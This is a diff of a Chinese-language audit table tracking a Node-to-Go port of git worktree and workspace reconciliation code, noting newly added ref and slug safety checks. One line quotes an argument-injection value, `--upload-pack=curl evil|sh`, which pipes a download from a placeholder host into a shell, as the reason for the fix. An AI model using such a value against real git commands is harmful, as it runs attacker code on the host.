@@ -80,7 +80,9 @@
 
 | `worktree-session.ts` | 929 | **PARTIAL** → 已补安全项 | `normalizeGitOptions` 的取值逻辑（worktreeName → gitOptions 的推导、slug 归一）Go 已在 handler 里做，但 **`assertSafeGitRef` 完全缺失**。`CreateWorktree` / `SwitchBranch` / `RenameBranch` / `Merge` 都把客户端字符串直接拼进 git 参数；git 会把 `-` 开头的值当选项，`--upload-pack=curl evil\|sh` 在 fetch 时就执行。已补 `AssertSafeGitRef`（字符集 + 首字符 + `..`/`@{`）与 `AssertSafeWorktreeSlug`（路径穿越），4 个测试覆盖注入与穿越，真实 worktree 创建仍正常。仍缺：`createBySpaceWorktreeWorkflow` 的 pr-number→checkoutSource 兼容层、`runWorktreeSetupInBackground` 的 runtimeEnv 注入。 |
 
-### 未审计（本批剩余 48 文件）
+| `workspace-reconciliation-service.ts` | 542 | **MISSING** → 已补 | 没有任何「定时从磁盘重新读取 git 事实」的机制：在终端里切分支后侧边栏一直显示旧分支，一个原本是普通目录的工作区后来变成 git 仓库也永远还是 `directory`。已补 `workspace_placement.go`（移植 `reconcileWorkspacePlacement`，只改真正变化的字段；已稳定的记录不重复写，避免每 5 分钟把 `updatedAt` 刷一遍并广播一堆无意义 update），并挂到 5 分钟定时器上（对应 Node 的 `DEFAULT_RESCAN_INTERVAL_MS`）。 |
+
+### 未审计（本批剩余 47 文件）
 
 按行数排序，下一轮从这里继续：
 
